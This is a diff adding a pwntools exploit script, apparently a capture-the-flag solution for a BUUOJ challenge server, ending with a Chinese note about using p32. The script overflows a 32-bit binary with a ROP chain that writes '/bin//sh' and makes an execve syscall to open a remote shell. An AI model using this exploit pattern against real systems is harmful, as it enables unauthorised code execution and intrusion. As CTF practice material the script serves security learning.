@@ -1,0 +1,43 @@
+from pwn import *
+context(arch='i386', os='linux', log_level='debug')
+io = remote('node5.buuoj.cn',25102)
+p = b'a' * 16
+
+p += p32(0x0806ecda)
+p += p32(0x080ea060)
+p += p32(0x080b8016)
+p += b'/bin'
+p += p32(0x0805466b)
+p += p32(0x0806ecda)
+p += p32(0x080ea064)
+p += p32(0x080b8016)
+p += b'//sh'
+p += p32(0x0805466b)
+p += p32(0x0806ecda)
+p += p32(0x080ea068)
+p += p32(0x080492d3)
+p += p32(0x0805466b)
+p += p32(0x080481c9)
+p += p32(0x080ea060)
+p += p32(0x080de769)
+p += p32(0x080ea068)
+p += p32(0x0806ecda)
+p += p32(0x080ea068)
+p += p32(0x080492d3)
+p += p32(0x0807a66f)
+p += p32(0x0807a66f)
+p += p32(0x0807a66f)
+p += p32(0x0807a66f)
+p += p32(0x0807a66f)
+p += p32(0x0807a66f)
+p += p32(0x0807a66f)
+p += p32(0x0807a66f)
+p += p32(0x0807a66f)
+p += p32(0x0807a66f)
+p += p32(0x0807a66f)
+p += p32(0x0806c943)
+
+io.sendline(p)
+io.interactive()
+
+要把linux里面的pack全部转化为p32
